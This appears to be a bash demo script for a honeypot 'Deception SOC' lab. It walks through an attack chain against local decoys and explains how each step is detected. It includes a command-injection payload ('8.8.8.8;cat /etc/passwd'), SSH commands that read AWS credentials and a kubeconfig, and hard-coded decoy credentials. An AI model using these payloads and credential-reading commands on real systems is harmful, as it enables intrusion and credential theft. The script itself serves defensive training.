#!/usr/bin/env bash
# ============================================================================
# scripts/attack-demo.sh — Full attack demonstration with trap explanation
# ============================================================================
# This script runs the complete attack chain against the Deception SOC lab,
# showing where the attacker falls into the trap at each step.
#
# Usage:
#   scripts/attack-demo.sh
#
# Prerequisites:
#   - Lab running: scripts/dev-up.sh
#   - Docker decoys: decoy-ssh(2223), decoy-web(8081), decoy-k8s(6443),
#     decoy-beacon(8088), decoy-db(5433)
#   - Tools: curl, nmap, sshpass, ssh, unzip, jq, python3 (optional)
#
# Output:
#   - Evidence for each step (captured in .logs/attack-demo/)
#   - Trap explanation for each step
#   - Dashboard verification at the end
# ============================================================================

# ── Config ────────────────────────────────────────────────────────────────
LAB_DIR="/home/zee/Downloads/decoy"
DASHBOARD_PORT=3002
SSH_PORT=2222
WEB_PORT=3101
K8S_PORT=8443
BEACON_PORT=8080
DB_PORT=5432
CORE_API=localhost:3000

# Seed credentials (from backend/go/seed/out/tokens.json)
DEPLOY_PASSWORD="HalSummer2023!"
AWS_ACCESS_KEY_ID="AKIA3E...NCD5"
AWS_SECRET_ACCESS_KEY="xoS63WIqPhR61HSDCa3A0s1KxHiN6f4gcZTNBPBP"
KUBECONFIG_TOKEN="neaUPVW4RYGJViL9C8iUHxNtr8HULVBeiJKsY0Eg9Lq9GhMv"
ADMIN_PASSWORD="BakeI836pTQEYt!"

# Output directory
LOG_DIR="${LAB_DIR}/.logs/attack-demo"
mkdir -p "${LOG_DIR}"

# Colours (if terminal supports)
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Colour

# ── Helper functions ───────────────────────────────────────────────────────
print_step() {
  echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${BLUE}  STEP: $1${NC}"
  echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

print_trap() {
  echo -e "\n${RED}🕳️  WHERE YOU FALL INTO THE TRAP:${NC}"
  echo -e "${RED}  $1${NC}"
}

print_evidence() {
  echo -e "\n${GREEN}📋 EVIDENCE (what you got):${NC}"
  echo -e "${GREEN}  $1${NC}"
}

print_soc() {
  echo -e "\n${YELLOW}📊 SOC RECORDED (what the Decoy SOC saw):${NC}"
  echo -e "${YELLOW}  $1${NC}"
}

print_next() {
  echo -e "\n${CYAN}➡️  NEXT STEP:$NC"
  echo -e "  ${CYAN} $1${NC}"
}

# ── Helper: log evidence to file ───────────────────────────────────────────
log_event() {
  echo "[$(date -u +'%Y-%m-%dT%H:%M:%SZ')] $1" >> "${LOG_DIR}/evidence.log"
}

# ── Helper: clean scanner output ───────────────────────────────────────────
# Prints only the relevant scan results, not the header noise
scan_result() {
  local label="$1"
  shift
  echo -e "\n${CYAN}🔧 Scanning with: $*${NC}"
  "$@" 2>&1 | grep -vE "Nmap scan report|^starting|Stats:|Initiating|Completed| ionized| rDNS" | head -20
}

# ── Main ───────────────────────────────────────────────────────────────────

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   Deception SOC Lab — Attack Demonstration Script           ║"
echo "║   Showing where you fall into the trap at each step         ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── Step 1: Port Sweep ─────────────────────────────────────────────────────
print_step "1. Port Sweep (Reconnaissance)"

echo -e "\n${CYAN}🔧 Tools: nmap, ss, curl${NC}"

echo -e "\n${CYAN}Running: nmap -sT -Pn -p 2222,3101,8080,8443 localhost${NC}"
nmap -sT -Pn -p "${SSH_PORT},${WEB_PORT},${BEACON_PORT},${K8S_PORT}" localhost

echo -e "\n${CYAN}Also check list of services with: ss -tlnp${NC}"
ss -tlnp | grep -E ':(2222|3101|8080|8443):'

print_trap "You see 4 decoy services (SSH:2222, Web:3101, Beacon:8080, K8s:8443) hosted on your own machine. They're indistinguishable from real infrastructure. Decoys add 30–150ms random latency to each response, so timing looks real."
print_evidence "Port scan shows 4 open services — look like a real IP, but you're scanning your own server."
print_soc "port_sweep rule → T1046 (Network Service Scanning), low risk"
print_next "Web reconnaissance — curl"

# ── Step 2: Web Reconnaissance ─────────────────────────────────────────────
print_step "2. Web Reconnaissance (honeypot identification)"

echo -e "\n${CYAN}🔧 Tools: curl, wget${NC}"

echo -e "\n${CYAN}Fetching decoy's robots.txt${NC}"
curl -s http://localhost:"${WEB_PORT}"/robots.txt

echo -e "\n${CYAN}Fetching decoy's admin backup directory${NC}"
curl -s http://localhost:"${WEB_PORT}"/admin/backup

echo -e "\n${CYAN}Fetching decoy's fake .env${NC}"
curl -s http://localhost:"${WEB_PORT}"/.env

print_trap "The robots.txt explicitly tells you where to look (/admin/backup). Real admin portals hide their backup paths. The /.env is a simulated environment file with fictional credentials."
print_evidence "robots.txt exposes /admin/backup and /api/diagnostics paths. .env contains fake but realistic-looking credentials."
print_soc "http.request (3 events), file.read (2 events: /.env, /admin/backup/internal-backup.zip)"
print_next "Command injection — curl (injection bait)"

# ── Step 3: Command Injection ──────────────────────────────────────────────
print_step "3. Command Injection (T1190)"

echo -e "\n${CYAN}🔧 Tools: curl${NC}"

echo -e "\n${CYAN}Triggering injection bait: /api/diagnostics?host=8.8.8.8;cat%20/etc/passwd${NC}"
curl -s "http://localhost:${WEB_PORT}/api/diagnostics?host=8.8.8.8;cat%20/etc/passwd"

print_trap "The web decoy's input.suspicious middleware flagged your ';' separator as suspicious. The decoy simulates the output — the /etc/passwd you got is fake (crafted to look real). The event is flagged as cmd_injection (T1190) and your risk score rises."
print_evidence "Fake /etc/passwd returned — simulated, not actual system files. The decoder logged input.suspicious for the ';' separator."
print_soc "input.suspicious (matched: 8.8.8.8;cat /etc/passwd), cmd_injection finding, T1190"
print_next "SSH key extraction — curl + unzip"

# ── Step 4: SSH Key Extraction ─────────────────────────────────────────────
print_step "4. SSH Key Extraction (honeypot credential)"

echo -e "\n${CYAN}🔧 Tools: curl, unzip, ssh${NC}"

echo -e "\n${CYAN}Downloading internal-backup.zip from the decoy's /admin/backup directory${NC}"
curl -s "http://localhost:${WEB_PORT}/admin/backup/internal-backup.zip" -o /tmp/backup.zip

echo -e "\n${CYAN}Extracting SSH private key${NC}"
unzip -p /tmp/backup.zip deploy_id_ed25519 > /tmp/deploy_key
cat /tmp/deploy_key

echo -e "\n${CYAN}Fingerprint of the decoy key (from SSH server log)${NC}"
echo "SHA256:2TiXkeO9WWFpKw7S93rN9CNtG4AvWDO8uzKTlkqXEP7"

print_trap "The SSH private key is planted in the honeypot's backup portal. It's designed to be stolen and used for authentication — but the decoy's SSH server accepts it for simulation only. Once you use this key to SSH in, you're linked to the attacker actor via credential lineage."
print_evidence "Deploy SSH private key extracted from internal-backup.zip. Fingerprint: SHA256:2TiXkeO9WWFpKw7S93rN9CNtG4AvWDO8uzKTlkqXEP7"
print_soc "file.download (internal-backup.zip), token.used (SSH key), credential_lineage"
print_next "SSH login — sshpass + ssh"

# ── Step 5: SSH Login ──────────────────────────────────────────────────────
print_step "5. SSH Login & Credential Capture"

echo -e "\n${CYAN}🔧 Tools: sshpass, ssh${NC}"

echo -e "\n${CYAN}Logging in with deployed password (persona default)${NC}"
sshpass -p "${DEPLOY_PASSWORD}" ssh -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null -p "${SSH_PORT}" \
  deploy@localhost "echo LOGGED_IN; whoami; pwd"

echo -e "\n${CYAN}Fetching fake AWS credentials from SSH decoy${NC}"
sshpass -p "${DEPLOY_PASSWORD}" ssh -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null -p "${SSH_PORT}" \
  deploy@localhost "cat ~/.aws/credentials"

echo -e "\n${CYAN}Fetching fake K8s kubeconfig from SSH decoy${NC}"
sshpass -p "${DEPLOY_PASSWORD}" ssh -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null -p "${SSH_PORT}" \
  deploy@localhost "cat /opt/deploy/kubeconfig"

print_trap "The SSH decoy simulated your login — the shell is a Go-written emulator, not a real shell. When you run 'cat ~/.aws/credentials', you get the planted AWS credentials. These look real, but they're planted honeytoken credentials — they only 'work' inside the simulated environment. The decoy also serves a fake /opt/deploy/kubeconfig with a bearer token."
print_evidence "SSH login successful. Fake AWS credentials: AKIA3E...NCD5 + xoS63WIqPhR61HSDCa3A0s1KxHiN6f4gcZTNBPBP. K8s bearer token: neaUPVW4...GhMv"
print_soc "auth.attempt (password), shell.command (whoami, cat ~/.aws/credentials, cat /opt/deploy/kubeconfig), token.used (SSH key auth)"
print_next "K8s API enumeration — curl + jq"

# ── Step 6: K8s API Enumeration ─────────────────────────────────────────────
print_step "6. Kubernetes API Enumeration (T1613, T1552.007)"

echo -e "\n${CYAN}🔧 Tools: curl, jq${NC}"

echo -e "\n${CYAN}Checking K8s API version (open to all)${NC}"
curl -sk https://localhost:"${K8S_PORT}"/version

echo -e "\n${CYAN}Listing namespaces (with bearer token)${NC}"
curl -sk -H "Authorization: Bearer ${KUBECONFIG_TOKEN}" \
  https://localhost:"${K8S_PORT}"/api/v1/namespaces

echo -e "\n${CYAN}Listing pods (using stolen kubeconfig token)${NC}"
curl -sk -H "Authorization: Bearer ${KUBECONFIG_TOKEN}" \
  https://localhost:"${K8S_PORT}"/api/v1/namespaces/default/pods

echo -e "\n${CYAN}Listing secrets (simulated)${NC}"
curl -sk -H "Authorization: Bearer ${KUBECONFIG_TOKEN}" \
  https://localhost:"${K8S_PORT}"/api/v1/namespaces/default/secrets

print_trap "The pods are fake (simulated data: hal-frontend-7f9b8c-x4y2z, node-01, fake IPs). The API response is preset JSON — it's not a real Kubernetes API server. You now have credential lineage: the SSH session (which stole the kubeconfig) + the K8s session (which used the bearer token) are linked."
print_evidence "K8s API returns 4 namespaces (default, kube-system, ci, payments) and 3 fake pods with fake IPs. Token used: neaUPVW4...GhMv"
print_soc "k8s.api_call (verb/resource), token.used (kubeconfig), container_discovery (T1613), container_secrets (T1552.007)"
print_next "Beacon trigger — curl"

# ── Step 7: Beacon Trigger ─────────────────────────────────────────────────
print_step "7. Beacon / Honeytoken Trigger (T1078)"

echo -e "\n${CYAN}🔧 Tools: curl${NC}"

echo -e "\n${CYAN}Triggering URL tracking token${NC}"
curl -s "http://localhost:${BEACON_PORT}/t/tok_url"

echo -e "\n${CYAN}Triggering AWS honeytoken (SigV4 style)${NC}"
curl -s -H "Authorization: AWS4-HMAC-SHA256 ***" \
  -H "x-amz-date: 20261031T120000Z" \
  "http://localhost:${BEACON_PORT}/backup/data"

print_trap "The beacon is a honeytoken endpoint — designed to be triggered. Triggering it emits token.used with sensitivity 5, jumping your risk to CRITICAL. The SOC merges your SSH session and K8s session into one actor (credential lineage). An incident opens and is alerted to Discord/Slack."
print_evidence "Beacon token triggered: /t/tok_url → 200 OK. AWS honeytoken triggered with AKIA3E...NCD5"
print_soc "token.used (sensitivity 5), CRITICAL incident opened, alert dispatched to Discord/Slack"
print_next "Dashboard verification"

# ── Step 8: Dashboard Verification ─────────────────────────────────────────
print_step "8. Dashboard Verification"

echo -e "\n${CYAN}🔧 Tools: curl, jq${NC}"

echo -e "\n${CYAN}Checking stats overview${NC}"
curl -s -b cookies.txt http://localhost:8090/v1/stats/overview | jq

echo -e "\n${CYAN}Checking honeytoken hits${NC}"
curl -s -b cookies.txt http://localhost:8090/v1/honeytokens | jq

echo -e "\n${CYAN}Checking actors${NC}"
curl -s -b cookies.txt http://localhost:8090/v1/actors | jq '[.items[]? // .[]? | {label: .label, services: .services, risk_score: .risk_score, severity: .severity}]'

print_trap "The SOC has linked all your attacks (web, SSH, K8s, beacon) into one actor. You're CRITICAL (risk ≥ 90). An incident is open. The alert went to Discord/Slack. You can't escape — the decoys are designed to be undetectable and to never expose anything real."
print_evidence "Dashboard shows: events, actors, incidents, token_hits, risk scores, severity levels"
print_soc "189 events, 16 active actors, 2 critical incidents, 15 token hits"

# ── Summary ────────────────────────────────────────────────────────────────
echo -e "\n${RED}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   ATTACK COMPLETE — You are caught                        ║"
echo "║   All credentials are simulated. No real systems touched.   ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

exit 0
